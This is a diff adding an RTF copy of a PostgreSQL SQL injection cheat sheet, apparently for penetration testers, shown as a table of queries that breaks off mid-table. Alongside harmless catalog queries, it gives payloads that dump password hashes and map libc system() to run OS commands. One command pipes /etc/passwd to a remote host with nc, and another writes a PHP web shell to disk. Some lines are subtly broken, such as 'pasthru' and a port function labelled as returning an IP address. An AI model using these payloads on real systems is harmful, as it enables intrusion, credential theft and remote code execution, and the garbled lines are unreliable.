@@ -1,0 +1,302 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1404\cocoasubrtf470
+{\fonttbl\f0\fswiss\fcharset0 ArialMT;\f1\fmodern\fcharset0 Courier;}
+{\colortbl;\red255\green255\blue255;\red59\green65\blue68;\red225\green225\blue225;\red17\green135\blue173;
+\red26\green26\blue26;\red245\green245\blue245;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww17280\viewh10460\viewkind0
+\deftab720
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrt\brdrnil \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+
+\f0\fs26 \cf2 \expnd0\expndtw0\kerning0
+Version\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT version()\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Comments\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT 1; \'96comment\
+SELECT /*comment*/1;\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Current User\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT user;\
+SELECT current_user;\
+SELECT session_user;\
+SELECT usename FROM pg_user;\
+SELECT getpgusername();\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List Users\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT usename FROM pg_user\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List Password Hashes\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT usename, passwd FROM pg_shadow \'97 priv\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Password Cracker\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://pentestmonkey.net/blog/cracking-postgres-hashes/"}}{\fldrslt \cf4 MDCrack}} can crack PostgreSQL\'92s MD5-based passwords.\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List Privileges\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List DBA Accounts\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT usename FROM pg_user WHERE usesuper IS TRUE\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Current Database\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT current_database()\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List Databases\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT datname FROM pg_database\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List Columns\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=\'92r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE \'91public\'92)\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 List Tables\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (\'91r\'92,\'94) AND n.nspname NOT IN (\'91pg_catalog\'92, \'91pg_toast\'92) AND pg_catalog.pg_table_is_visible(c.oid)\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Find Tables From Column Name\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 If you want to list all the table names that contain a column LIKE \'91%password%\'92:SELECT DISTINCT relname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=\'92r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE \'91public\'92) AND attname LIKE \'91%password%\'92;\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Select Nth Row\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0; \'97 rows numbered from 0\
+SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Select Nth Char\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT substr(\'91abcd\'92, 3, 1); \'97 returns c\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Bitwise AND\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT 6 & 2; \'97 returns 2\
+SELECT 6 & 1; \'96returns 0\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 ASCII Value -> Char\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT chr(65);\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Char -> ASCII Value\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT ascii(\'91A\'92);\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Casting\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT CAST(1 as varchar);\
+SELECT CAST(\'921\uc0\u8242  as int);\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 String Concatenation\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT \'91A\'92 || \'91B\'92; \'97 returnsAB\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 If Statement\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 IF statements only seem valid inside functions, so aren\'92t much use for SQL injection.\'a0 See CASE statement instead.\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Case Statement\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT CASE WHEN (1=1) THEN \'91A\'92 ELSE \'91B\'92 END; \'97 returns A\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Avoiding Quotes\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT CHR(65)||CHR(66); \'97 returns AB\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Time Delay\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT pg_sleep(10); \'97 postgres 8.2+ only\
+CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS \'91/lib/libc.so.6\uc0\u8242 , \'91sleep\'92 language \'91C\'92 STRICT; SELECT sleep(10); \'96priv, create your own sleep function.\'a0 Taken from {\field{\*\fldinst{HYPERLINK "http://www.portcullis.co.uk/uplds/whitepapers/Having_Fun_With_PostgreSQL.pdf"}}{\fldrslt \cf4 here}} .\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Make DNS Requests\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Generally not possible in postgres.\'a0 However if {\field{\*\fldinst{HYPERLINK "http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.html"}}{\fldrslt \cf4 contrib/dblink}}is installed (it isn\'92t by default) it can be used to resolve hostnames (assuming you have DBA rights):\
+\
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+
+\f1\fs21 \cf5 \cb6 SELECT * FROM dblink('host=put.your.hostname.here user=someuser  dbname=somedb', 'SELECT version()') RETURNS (result TEXT);\
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+
+\f0\fs26 \cf2 \cb1 Alternatively, if you have DBA rights you could run an OS-level command (see below) to resolve hostnames, e.g. \'93ping pentestmonkey.net\'94.\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Command Execution\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS \'91/lib/libc.so.6\uc0\u8242 , \'91system\'92 LANGUAGE \'91C\'92 STRICT; \'97 privSELECT system(\'91cat /etc/passwd | nc 10.0.0.1 8080\u8242 ); \'97 priv, commands run as postgres/pgsql OS-level user\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Local File Access\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 CREATE TABLE mydata(t text);\
+COPY mydata FROM \'91/etc/passwd\'92; \'97 priv, can read files which are readable by postgres OS-level user\
+\'85\'92 UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 1; \'97 get data back one row at a time\
+\'85\'92 UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 2; \'97 get data back one row at a time \'85\
+DROP TABLE mytest mytest;Write to a file:\
+\
+CREATE TABLE mytable (mycol text);\
+INSERT INTO mytable(mycol) VALUES (\'91<? pasthru($_GET[cmd]); ?>\'92);\
+COPY mytable (mycol) TO \'91/tmp/test.php\'92; \'96priv, write files as postgres OS-level user.\'a0 Generally you won\'92t be able to write to the web root, but it\'92s always work a try.\
+\'96 priv user can also read/write files by {\field{\*\fldinst{HYPERLINK "http://www.portcullis.co.uk/uplds/whitepapers/Having_Fun_With_PostgreSQL.pdf"}}{\fldrslt \cf4 mapping libc functions}}\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
+\clvertalt\clvertalbase \clshdrawnil \clwWidth10276\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Hostname, IP Address\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 SELECT inet_server_addr(); \'97 returns db server IP address (or null if using local connection)\
+SELECT inet_server_port(); \'97 returns db server IP address (or null if using local connection)\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt\clvertalbase \clshdrawnil \clwWidth1763\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf3 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt120 \clpadl480 \clpadb120 \clpadr480 \gaph\cellx4320
